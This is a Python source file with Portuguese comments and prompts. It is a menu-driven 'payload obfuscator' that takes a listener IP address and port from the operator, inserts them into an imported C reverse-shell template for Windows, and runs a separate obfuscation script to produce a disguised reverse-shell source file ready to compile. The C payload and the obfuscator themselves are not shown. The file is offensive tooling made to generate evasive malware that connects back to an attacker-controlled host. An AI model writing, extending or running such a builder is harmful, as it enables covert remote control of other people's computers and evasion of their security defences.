# menu_principal.py

import re
import json
import subprocess
from pathlib import Path
import os
import sys

# Importa o código C base (exploit1.c)
from c_exploit_template import C_CODE_TEMPLATE 

# Nomes de Arquivos Temporários/Finais
TEMP_INPUT_FILE = Path('codigo_para_ofuscar.c')
OUTPUT_FILE = Path('shell_reverso_ofuscado.c')
MAPS_FILE = Path('shell_reverso_maps.json')
OFUSCADOR_SCRIPT = 'ofuscador.py' # Nome do seu script ofuscador

def processar_ofuscacao(ip_addr: str, porta: int):
    
    # 1. Configurar o Código C (substituir placeholders)
    codigo_c_modificado = C_CODE_TEMPLATE.replace(
        '"(seu_ip)"', f'"{ip_addr}"'
    ).replace(
        '"(sua_porta)"', f'"{porta}"'
    )

    print(f"\n-> 📝 Configurando o código C base com IP {ip_addr}:{porta}...")
    
    try:
        # 2. Salvar o arquivo C configurado em um arquivo temporário
        TEMP_INPUT_FILE.write_text(codigo_c_modificado, encoding='utf-8')
        print(f"-> Arquivo temporário criado: {TEMP_INPUT_FILE}")

        # 3. Executar o script ofuscador.py como um processo externo
        print(f"-> ⚙️ Executando script externo: {OFUSCADOR_SCRIPT}...")
        
        # O subprocesso chama o script Python passando os argumentos de entrada e saída
        resultado = subprocess.run([
            sys.executable, # Garante que está usando o mesmo interpretador Python
            OFUSCADOR_SCRIPT,
            '--input', str(TEMP_INPUT_FILE),
            '--output', str(OUTPUT_FILE),
            '--maps', str(MAPS_FILE) # Assume que seu ofuscador aceita --maps
        ], capture_output=True, text=True, check=False)

        # 4. Verificar o resultado da execução
        if resultado.returncode == 0:
            print("\n" + "="*50)
            print("## ✅ SUCESSO! Shell Reverso Ofuscado Gerado ##")
            print(f"Arquivo C OFUSCADO (Pronto para compilar): **{OUTPUT_FILE.resolve()}**")
            # O output do ofuscador deve estar no stdout
            print(resultado.stdout) 
            print("="*50)
        else:
            print("\n🚨 ERRO na Execução do Ofuscador! 🚨")
            print(f"Caminho do script: {Path(OFUSCADOR_SCRIPT).resolve()}")
            print(f"Código de Retorno: {resultado.returncode}")
            print("\n--- STDOUT (Saída Padrão) ---")
            print(resultado.stdout)
            print("\n--- STDERR (Saída de Erro) ---")
            print(resultado.stderr)

    except FileNotFoundError:
        print(f"\n🚨 ERRO: Não foi possível encontrar o script '{OFUSCADOR_SCRIPT}'.")
        print("Certifique-se de que ele está no mesmo diretório.")
    except Exception as e:
        print(f"\n🚨 Ocorreu um erro geral durante o processo: {e}")
        
    finally:
        # 5. Limpar o arquivo temporário
        if TEMP_INPUT_FILE.exists():
            os.remove(TEMP_INPUT_FILE)
            print(f"-> Limpando arquivo temporário: {TEMP_INPUT_FILE}")

# --- FUNÇÃO PRINCIPAL DO MENU ---

def menu_principal():
    
    print("\n" + "="*50)
    print("      🔌 OFUSCADOR DE PAYLOAD (Multi-Linguagem Ready) 💾")
    print("="*50)

    # 1. Escolha da Linguagem (Fácil de expandir)
    while True:
        print("\nEscolha o Payload para Configurar:")
        print("  [1] C (Shell Reverso para Windows)")
        print("  [0] Sair")
        
        escolha = input("Opção: ").strip()
        
        if escolha == '1':
            linguagem_selecionada = 'C'
            break
        elif escolha == '0':
            print("\n👋 Saindo do programa. Tchau!")
            return
        else:
            print("❌ Opção inválida.")
            
    # 2. Coleta de Configurações de Rede
    print(f"\n--- Configurações de Rede para {linguagem_selecionada} ---")
    
    while True:
        ip_addr = input("Digite o ENDEREÇO IP (Seu IP de escuta): ").strip()
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip_addr):
            break
        print("❌ IP inválido. Tente novamente.")

    while True:
        try:
            porta = int(input("Digite a PORTA (Porta de escuta): "))
            if 1 <= porta <= 65535:
                break
            else:
                print("❌ Porta fora do intervalo válido (1-65535).")
        except ValueError:
            print("❌ Entrada inválida. Digite um número inteiro.")

    # 3. Processamento
    if linguagem_selecionada == 'C':
        processar_ofuscacao(ip_addr, porta)
    # Futuramente, você adicionaria 'elif' para outras linguagens aqui.

# --- Ponto de Entrada do Programa ---

if __name__ == "__main__":
    menu_principal()